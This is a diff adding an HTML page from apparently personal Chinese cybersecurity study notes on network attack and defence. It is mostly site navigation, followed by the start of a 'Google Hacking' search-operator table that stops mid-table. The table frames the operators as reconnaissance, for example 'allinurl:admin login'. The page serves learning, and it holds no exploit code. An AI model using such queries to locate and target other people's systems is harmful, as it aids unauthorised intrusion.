@@ -1,0 +1,2862 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="网络安全工程师的学习笔记">
+      
+      
+        <meta name="author" content="Josh">
+      
+      
+      
+        <link rel="prev" href="../AI%20Security/">
+      
+      
+        <link rel="next" href="../Cryptography/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Attack and Defence - 网络安全工程师的学习笔记</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="网络安全工程师的学习笔记" class="md-header__button md-logo" aria-label="网络安全工程师的学习笔记" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            网络安全工程师的学习笔记
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Attack and Defence
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="light-blue"  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Coding%20Language/C/" class="md-tabs__link">
+          
+  
+  
+  Coding Language
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Computer%20Fundamentals/Linux/" class="md-tabs__link">
+          
+  
+  
+  Computer Fundamentals
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../AI%20Security/" class="md-tabs__link">
+          
+  
+  
+  Cyber Security
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Testing/Black-box%20Testing/" class="md-tabs__link">
+          
+  
+  
+  Testing
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="网络安全工程师的学习笔记" class="md-nav__button md-logo" aria-label="网络安全工程师的学习笔记" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    网络安全工程师的学习笔记
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Coding Language
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            Coding Language
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Coding%20Language/C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    C
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Coding%20Language/Python/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Python
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Computer Fundamentals
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Computer Fundamentals
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Computer%20Fundamentals/Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Computer%20Fundamentals/Operating%20System/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Operating System
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Computer%20Fundamentals/Protocol/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protocol
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Computer%20Fundamentals/SQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cyber Security
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Cyber Security
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AI%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI Security
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Attack and Defence
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Attack and Defence
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络信息收集技术
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络信息收集技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络踩点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络踩点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web 信息搜索与挖掘
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS 与 IP 查询
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络扫描
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络扫描">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      主机扫描
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      端口扫描
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      系统类型探查
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞扫描
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络查点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络查点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络服务旗标抓取
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      通用网络服务查点
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unix" class="md-nav__link">
+    <span class="md-ellipsis">
+      类 UNIX 平台网络服务查点
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows 平台网络服务查点
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络查点防范措施
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络嗅探与协议分析
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络嗅探与协议分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络嗅探
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络嗅探">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络嗅探的原理与实现
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络嗅探器软件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络嗅探的探测与防范
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络协议分析
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络协议分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络协议分析技术
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wireshark" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络协议分析工具 Wireshark
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tcpip" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP/IP 网络协议栈攻击
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TCP/IP 网络协议栈攻击">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      概述
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="概述">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络安全属性和与攻击模式
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcpip_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP/IP 网络协议栈安全缺陷与攻击技术
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      原始报文伪造技术及工具
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络层协议攻击
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络层协议攻击">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      IP 源地址欺骗
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#arp" class="md-nav__link">
+    <span class="md-ellipsis">
+      ARP 欺骗
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#icmp" class="md-nav__link">
+    <span class="md-ellipsis">
+      ICMP 路由重定向攻击
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      传输层协议攻击
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="传输层协议攻击">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tcp-rst" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP RST 攻击
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP 会话劫持攻击
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp-syn-flood" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP SYN Flood 拒绝服务攻击
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#udp-flood" class="md-nav__link">
+    <span class="md-ellipsis">
+      UDP Flood 拒绝服务攻击
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcpip_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      TCP/IP 网络协议栈攻击防范措施
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络安全防范技术
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络安全防范技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      安全模型
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络安全防范技术和与系统
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络安全防范技术和与系统">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      防火墙技术概述
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      防火墙技术和产品
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络检测技术与系统
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络检测技术与系统">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      入侵检测技术概述
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snort" class="md-nav__link">
+    <span class="md-ellipsis">
+      入侵检测系统：Snort
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络安全事件响应技术
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cryptography/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cryptography
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Security%20Equipment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Security Equipment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OS Security
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SonarQube/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SonarQube
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQLmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQLmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vulnerabilities
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Testing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Testing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Testing/Black-box%20Testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Black-box Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="_1">网络安全攻防技术<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="_2">网络信息收集技术<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="_3">网络踩点<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h4 id="web">Web 信息搜索与挖掘<a class="headerlink" href="#web" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Google Hacking</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>功能类别</th>
+<th>操作符</th>
+<th>用法示例</th>
+<th>核心作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>基础逻辑控制</td>
+<td>" "</td>
+<td>"人工智能发展趋势"</td>
+<td>精确匹配引号内的完整词组，排除拆分或语序不同的结果。</td>
+</tr>
+<tr>
+<td></td>
+<td>-</td>
+<td>机器学习 -课程</td>
+<td>排除包含 “课程” 关键词的结果，仅保留与 “机器学习” 相关的非课程内容。</td>
+</tr>
+<tr>
+<td></td>
+<td>OR</td>
+<td>Python OR Java</td>
+<td>查找包含任意一个关键词的结果。</td>
+</tr>
+<tr>
+<td></td>
+<td>AND（可省略）</td>
+<td>数据挖掘 AND 实战（等同于 “数据挖掘 实战”）</td>
+<td>查找同时包含所有关键词的结果，Google 默认用空格实现 “逻辑与”，AND可显式强调。</td>
+</tr>
+<tr>
+<td>页面元素定位</td>
+<td>intitle:</td>
+<td>intitle:网站安全漏洞</td>
+<td>仅返回 “标题” 中包含 “网站安全漏洞” 的网页。</td>
+</tr>
+<tr>
+<td></td>
+<td>allintitle:</td>
+<td>allintitle:SEO 优化技巧</td>
+<td>仅返回 “标题” 中同时包含 “SEO” 和 “优化技巧” 的网页。</td>
+</tr>
+<tr>
+<td></td>
+<td>intext:</td>
+<td>intext:用户隐私保护</td>
+<td>仅返回 “正文内容” 中包含 “用户隐私保护” 的网页。</td>
+</tr>
+<tr>
+<td></td>
+<td>allintext:</td>
+<td>allintext:区块链 应用场景 金融</td>
+<td>仅返回 “正文内容” 中同时包含 “区块链”“应用场景”“金融” 的网页。</td>
+</tr>
+<tr>
+<td></td>
+<td>inurl:</td>
+<td>inurl:blog tech</td>
+<td>仅返回 “URL 链接” 中包含 “blog” 和 “tech” 的网页（关键词顺序可灵活）。</td>
+</tr>
+<tr>
+<td></td>
+<td>allinurl:</td>
+<td>allinurl:admin login</td>
+<td>仅返回 “URL 链接” 中同时包含 “admin” 和 “login” 的网页（关键词需全部出现）。</td>
+</tr>
+<tr>
+<td></td>
